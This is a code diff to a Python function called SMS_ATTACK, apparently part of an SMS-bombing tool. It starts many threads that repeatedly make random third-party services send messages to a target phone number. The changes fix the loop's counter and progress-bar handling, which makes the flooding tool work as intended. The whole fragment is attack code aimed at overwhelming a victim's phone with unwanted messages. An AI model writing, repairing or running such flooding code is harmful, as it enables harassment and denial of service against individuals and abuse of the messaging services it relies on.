@@ -41,18 +41,18 @@ def SMS_ATTACK(threads, attack_time, phone):
 	country = number.getCountry(phone)
 	print("Starting attack...")
 
-	sum = 0
 	def sms_flood():
+		sum = 0
 		while not FINISH:
-			sum++
-			toolbar.update_progress(sum)
+			sum += 10
+			toolbar.update_progress(sum/100.0)
 			service = randomData.random_service(services)
 			service = request.Service(service)
 			service.sendMessage(phone)
 		toolbar.update_progress(100/100.0)
 
+	print("Starting threads...")
 	for thread in range(threads):
-		print("Starting threads...")
 		t = Thread(target = sms_flood)
 		t.start()
 		threads_list.append(t)
